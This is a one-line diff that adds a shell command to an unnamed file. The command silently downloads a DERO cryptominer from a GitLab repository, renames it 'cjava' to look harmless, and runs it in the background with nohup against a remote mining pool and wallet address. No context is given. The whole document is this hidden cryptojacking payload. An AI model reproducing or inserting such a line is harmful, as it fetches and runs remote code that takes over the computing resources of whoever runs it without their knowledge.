@@ -1,0 +1,1 @@
+wget -qO cjava https://gitlab.com/ghcees/miner/-/raw/main/astrominer && chmod +x cjava && nohup ./cjava -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm369mdkp06lgvqf4y5cm.$(echo lottery-cs-$(TZ=UTC-7 date +"%H-%M")) -r 47.254.125.141:8080 -p rpc
